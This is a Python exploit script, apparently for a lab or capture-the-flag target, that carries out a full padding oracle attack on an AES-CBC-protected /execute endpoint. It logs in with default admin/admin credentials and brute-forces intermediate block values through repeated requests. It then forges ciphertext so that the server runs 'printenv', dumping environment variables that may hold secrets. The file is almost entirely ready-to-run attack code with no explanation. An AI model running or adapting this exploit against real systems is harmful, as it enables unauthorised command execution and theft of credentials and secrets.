import base64
import requests
from Crypto.Util.Padding import pad

BLOCK_SIZE = 16
TARGET_URL = "http://madlabs.pw/execute"

# Target plaintext (must be 16 bytes with PKCS#7 padding)
TARGET_PLAINTEXT = b'{"printenv":"--null"}'


def xor_bytes(a, b):
    """XOR two byte sequences."""
    return bytes([x ^ y for x, y in zip(a, b)])


def login_request():
    """Obtain a fresh session token for each request."""
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://madlabs.pw',
        'Referer': 'http://madlabs.pw/',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    }
    data = {'username': 'admin', 'password': 'admin'}

    response = requests.post(
        "http://madlabs.pw/login",
        headers=headers,
        data=data,
        verify=False
    )
    if response.status_code == 200:
        return response.history[0].cookies.get("session")
    else:
        raise Exception("Login failed!")


def send_payload(ciphertext_bytes):
    """Send forged ciphertext and return server response."""
    session_token = login_request()  # Fresh session per request

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'http://madlabs.pw',
        'Referer': 'http://madlabs.pw/shell',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36'
    }

    cookies = {"session": session_token}
    data = {"command": base64.b64encode(ciphertext_bytes).decode()}

    response = requests.post(
        TARGET_URL,
        headers=headers,
        cookies=cookies,
        data=data,
        verify=False
    )
    return response.text


def decrypt_block(ciphertext_block):
    """Use padding oracle to recover intermediate value for ciphertext_block."""
    intermediate = bytearray(BLOCK_SIZE)
    fake_block = bytearray(BLOCK_SIZE)  # This is the block we modify

    for byte_index in reversed(range(BLOCK_SIZE)):
        pad_val = BLOCK_SIZE - byte_index

        # Prepare known suffix
        for i in range(byte_index + 1, BLOCK_SIZE):
            fake_block[i] = intermediate[i] ^ pad_val

        # Brute-force each byte
        for guess in range(256):
            fake_block[byte_index] = guess
            payload = bytes(fake_block + ciphertext_block)
            response = send_payload(payload)

            if "Invalid padding bytes" not in response:
                intermediate[byte_index] = guess ^ pad_val
                print(f"[+] Byte {byte_index} = {intermediate[byte_index]:02x} (guess={guess:02x})")
                break
        else:
            print(f"[!] Failed to guess byte {byte_index}")
            exit(1)

    return bytes(intermediate)


def forge_ciphertext(intermediate, plaintext_block):
    """XOR intermediate value with desired plaintext to get the forged block."""
    return xor_bytes(intermediate, plaintext_block)


def main():
    # Choose a fixed fake block (C1)
    fake_c1 = b"\x00" * BLOCK_SIZE
    print("[*] Starting padding oracle attack...")

    # Intermediate value (Decrypt(C0))
    intermediate_C0 = decrypt_block(fake_c1)
    # intermediate_C0 = b''.fromhex('1fa6430fcb3ed87f648b0503d7db0d8e')
    print("\n[+] Intermediate value (Decrypt(C0)):")
    print(intermediate_C0.hex())

    # Step 3: Forge C0 block that decrypts to TARGET_PLAINTEXT
    target_pt = pad(TARGET_PLAINTEXT, BLOCK_SIZE)
    target_pt_1 = target_pt[16:32]
    print(f"[+] Target PT 1: {target_pt_1.hex()}")
    forged_C0 = forge_ciphertext(intermediate_C0, target_pt_1)
    print("\n[+] Forged C0 block:")
    print(forged_C0.hex())

    # Step 2: Recover intermediate value of C1
    intermediate_C1 = decrypt_block(forged_C0)
    # intermediate_C1 = b''.fromhex('ccf46a247e7cd4e8142290012a1c0a7a')
    print("\n[+] Intermediate value (Decrypt(C1)):")
    print(intermediate_C1.hex())

    # Step 3: Forge C1 block that decrypts to TARGET_PLAINTEXT (second part)
    target_pt_2 = target_pt[0:16]
    print(f"[+] Target PT 2: {target_pt_2.hex()}")  # Debug print
    forged_C1 = forge_ciphertext(intermediate_C1, target_pt_2)
    print("\n[+] Forged C1 block:")
    print(forged_C1.hex())

    # Step 4: Final payload is forged_C1 + forged_C0
    final_payload = forged_C1 + forged_C0 + fake_c1
    final_b64 = base64.b64encode(final_payload).decode()

    print("\n[+] Final forged payload (base64):", final_b64)

    # Step 5: Send to server
    print("\n[*] Sending payload to server...")
    response = send_payload(final_payload)
    print("\n[+] Server response:")
    print(response)


if __name__ == "__main__":
    main()
